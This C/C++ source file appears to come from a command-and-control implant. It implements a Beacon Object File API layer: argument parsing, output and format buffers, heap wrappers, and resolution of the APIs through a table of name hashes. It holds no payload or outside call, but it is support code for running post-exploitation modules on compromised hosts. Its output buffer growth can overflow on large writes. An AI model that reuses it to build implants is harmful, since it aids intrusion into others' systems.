#include <windows.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Hash.h>
#include <Bof.h>

static inline UINT32 bswap32( UINT32 v )
{
    return ((v >> 24) & 0xFF)
        | ((v >> 8) & 0xFF00)
        | ((v << 8) & 0xFF0000)
        | ((v << 24) & 0xFF000000);
}

static inline UINT16 bswap16( UINT16 v)
{
    return (UINT16)( ((v >>8) & 0xFF) | ((v << 8) & 0xFF00) );
}

// Converts an integer to a string - base 10 for %d/%u , base 16 for %x
static VOID  bof_itoa( UINT64 val, PCHAR out, INT base, BOOL is_signed )
{
    CHAR  tmp[32];
    INT   i = 0;

    if ( is_signed && (INT64)val < 0 ) {
        *out++ = '-';
        val = (UINT64)(-(INT64)val);
    }

    if ( val == 0 ) { *out++ = '0'; *out = '\0'; return; }

    PCHAR digits = (PCHAR)"0123456789abcdef";
    while ( val > 0 ) {
        tmp[i++] = digits[val % base];
        val /= base;
    }

    // digits are in reverse - flip them into out
    while ( i-- > 0 ) *out++ = tmp[i];
    *out = '\0';
}

// walks a printf-style format string and writes the result into out (max outsize bytes)
static VOID bof_vformat( PCHAR out, INT outsize, PCHAR fmt_str, va_list args )
{
    INT pos = 0;
    while ( *fmt_str && pos < outsize - 1 ) {
        if ( *fmt_str != '%' ) {
            out[pos++] = *fmt_str++;
            continue;
        }
        fmt_str++; // skip the '%'

        CHAR tmp[32];
        switch ( *fmt_str++ ) {
            case 's': {
                PCHAR s = va_arg( args, PCHAR );
                if ( !s ) s = (PCHAR)"(null)";
                while ( *s && pos < outsize - 1 ) out[pos++] = *s++;
                break;
            }
            case 'l': {
                // %ls - wide string; consume the 's' then print as ASCII
                if ( *fmt_str == 's' ) fmt_str++;
                wchar_t* ws = va_arg( args, wchar_t* );
                if ( !ws ) ws = L"(null)";
                while ( *ws && pos < outsize - 1 ) out[pos++] = (CHAR)(*ws++ & 0xFF);
                break;
            }
            case 'd':
                bof_itoa( (UINT64)va_arg(args, INT),  tmp, 10, TRUE );
                for ( PCHAR p = tmp; *p && pos < outsize-1; ) out[pos++] = *p++;
                break;
            case 'u':
                bof_itoa( (UINT64)va_arg(args, UINT), tmp, 10, FALSE );
                for ( PCHAR p = tmp; *p && pos < outsize-1; ) out[pos++] = *p++;
                break;
            case 'x':
                bof_itoa( (UINT64)va_arg(args, UINT), tmp, 16, FALSE );
                for ( PCHAR p = tmp; *p && pos < outsize-1; ) out[pos++] = *p++;
                break;
            case 'c':
                out[pos++] = (CHAR)va_arg(args, INT);
                break;
            case '%':
                out[pos++] = '%';
                break;
        }
    }
    out[pos] = '\0';
}

static inline INT bof_strlen( PCHAR s ) {
    INT n = 0; while ( *s++ ) n++; return n;
}

// initializes the datap parser - skips the 4-byte total-length header prepended by ax.bof_pack
DECLFN VOID BeaconDataParse( datap* parser, PCHAR buf, INT size )
{
    parser->Original = buf;
    parser->Buffer   = buf + 4;
    parser->Size     = size - 4;
    parser->Length   = size - 4;
}

// reads 4 bytes little-endian from the cursor, advances cursor by 4
DECLFN INT BeaconDataInt( datap* parser )
{
    UINT32 val = *(UINT32*)parser->Buffer;
    parser->Buffer += 4;
    parser->Length -= 4;
    return (INT)val;
}

// reads 2 bytes little-endian from the cursor, advances cursor by 2
DECLFN SHORT BeaconDataShort( datap* parser )
{
    UINT16 val = *(UINT16*)parser->Buffer;
    parser->Buffer += 2;
    parser->Length -= 2;
    return (SHORT)val;
}

// returns how many bytes are left to read in the buffer
DECLFN INT BeaconDataLength( datap* parser )
{
    return parser->Length;
}

// reads a length-prefixed blob: reads 4-byte LE length, returns pointer to data, advances cursor
DECLFN PCHAR BeaconDataExtract( datap* parser, INT* outsize )
{
    UINT32 len = *(UINT32*)parser->Buffer;
    parser->Buffer += 4;

    PCHAR data = parser->Buffer;
    parser->Buffer += len;
    parser->Length -= ( 4 + len );

    if ( outsize ) *outsize = (INT)len;
    return data;
}


// Appends data to the agents BOF output buffer, growing it if needed
DECLFN VOID BeaconOutput( INT type, PCHAR data, INT len )
{
    G_AGENT;
    (void)type;     // type is CALLBACK_OUTPUT, CALLBACK_ERROR etc

    if ( !Self->Bof.OutputBuf )
    {
        Self->Bof.OutputBuf = Heap_Alloc( 4096 );
        Self->Bof.OutputCap = 4096;
        Self->Bof.OutputLen = 0;
    }

    // grow if not enough space
    if ( Self->Bof.OutputLen + len > Self->Bof.OutputCap )
    {
        Self->Bof.OutputBuf = Heap_Realloc( Self->Bof.OutputBuf, Self->Bof.OutputCap * 2 );
        Self->Bof.OutputCap *= 2;
    }

    // Copy the new data after what's already there
    Mem_Copy( (BYTE*)Self->Bof.OutputBuf + Self->Bof.OutputLen, data, len );
    Self->Bof.OutputLen += len;
}


// Converts an integer to a string - base 10 for %d/%u, base 16 for %x
DECLFN VOID BeaconPrintf( INT type, PCHAR fmt_str, ... )
{
    CHAR    buf[2048];
    va_list args;

    va_start( args, fmt_str );
    bof_vformat( buf, sizeof(buf), fmt_str, args );
    va_end( args );

    BeaconOutput( type, buf, bof_strlen(buf) );
}

// Allocates a format buffer of the given size - BOF calls this before appending anything
DECLFN VOID BeaconFormatAlloc( fmt* format, INT maxsz )
{

    format->Original = (PCHAR)Heap_Alloc( maxsz );
    format->Buffer   = format->Original;
    format->Length   = maxsz;
    format->Size     = maxsz;
}

// Frees the format buffer heap allocation and zeros the struct
DECLFN VOID BeaconFormatFree( fmt* format )
{
    if ( format->Original ) Heap_Free( format->Original );
    Mem_Set( format, 0 , sizeof(fmt) );
}

// Resets the write cursor back to the start and zeros the buffer contents
DECLFN VOID BeaconFormatReset( fmt* format )
{
    Mem_Set( format->Original, 0, format->Size );
    format->Buffer = format->Original;
    format->Length = format->Size;
}

// Copies len bytes from data into the format buffer and adavacne the write cursor
DECLFN VOID BeaconFormatAppend( fmt* format, PCHAR data, INT len )
{
    if ( len > format->Length ) return; // not enough space - silently drop

    Mem_Copy( format->Buffer, data, len );
    format->Buffer += len;
    format->Length -= len;
}

// formats a printf-style string and appends the result into the format buffer
DECLFN VOID BeaconFormatPrintf( fmt* format, PCHAR fmt_str, ... )
{
    CHAR    buf[2048];
    va_list args;

    va_start( args, fmt_str );
    bof_vformat( buf, sizeof(buf), fmt_str, args );
    va_end( args );

    BeaconFormatAppend( format, buf, bof_strlen(buf) );
}

// Returns a pointer to the formatted data and writes the total bytes written to outsize
DECLFN PCHAR BeaconFormatToString( fmt* format, INT* outsize )
{
    *outsize = format->Size - format->Length; // bytes written = total cap minus remaining space
    return format->Original;
}

// appends a 4-byte big-endian integer into the format buffer
DECLFN VOID BeaconFormatInt( fmt* format, INT val )
{
    UINT32 be = bswap32( (UINT32)val ); // convert to big-endian
    BeaconFormatAppend( format, (PCHAR)&be, 4 );
}


// allocates memory from the agent heap - BOF equivalent of malloc
DECLFN PVOID BeaconHeapAlloc( DWORD size )
{
    return Heap_Alloc( size );
}

// frees a heap allocation
DECLFN VOID BeaconHeapFree( PVOID ptr )
{
    Heap_Free( ptr );
}

// reallocates a heap allocation to a new size
DECLFN PVOID BeaconHeapReAlloc( PVOID ptr, DWORD size )
{
    return Heap_Realloc( ptr, size );
}

// Resolving Beacon APIs
DECLFN PVOID Bof_RslBeaconApi( PCHAR name )
{
    static BEACON_API_ENTRY ApiTable[] = {
        { Hash::Str("BeaconDataParse"),      (PVOID)BeaconDataParse      },
        { Hash::Str("BeaconDataInt"),        (PVOID)BeaconDataInt        },
        { Hash::Str("BeaconDataShort"),      (PVOID)BeaconDataShort      },
        { Hash::Str("BeaconDataLength"),     (PVOID)BeaconDataLength     },
        { Hash::Str("BeaconDataExtract"),    (PVOID)BeaconDataExtract    },
        { Hash::Str("BeaconOutput"),         (PVOID)BeaconOutput         },
        { Hash::Str("BeaconPrintf"),         (PVOID)BeaconPrintf         },
        { Hash::Str("BeaconFormatAlloc"),    (PVOID)BeaconFormatAlloc    },
        { Hash::Str("BeaconFormatFree"),     (PVOID)BeaconFormatFree     },
        { Hash::Str("BeaconFormatReset"),    (PVOID)BeaconFormatReset    },
        { Hash::Str("BeaconFormatAppend"),   (PVOID)BeaconFormatAppend   },
        { Hash::Str("BeaconFormatPrintf"),   (PVOID)BeaconFormatPrintf   },
        { Hash::Str("BeaconFormatToString"), (PVOID)BeaconFormatToString },
        { Hash::Str("BeaconFormatInt"),      (PVOID)BeaconFormatInt      },
        { Hash::Str("BeaconHeapAlloc"),      (PVOID)BeaconHeapAlloc      },
        { Hash::Str("BeaconHeapFree"),       (PVOID)BeaconHeapFree       },
        { Hash::Str("BeaconHeapReAlloc"),    (PVOID)BeaconHeapReAlloc    },
        { 0, nullptr }
    };

    UINT32 h = Hash::Str( name );
    for ( INT i = 0; ApiTable[i].Ptr; i++ ) {
        if ( ApiTable[i].Hash == h ) return ApiTable[i].Ptr;
    }
    return nullptr;
}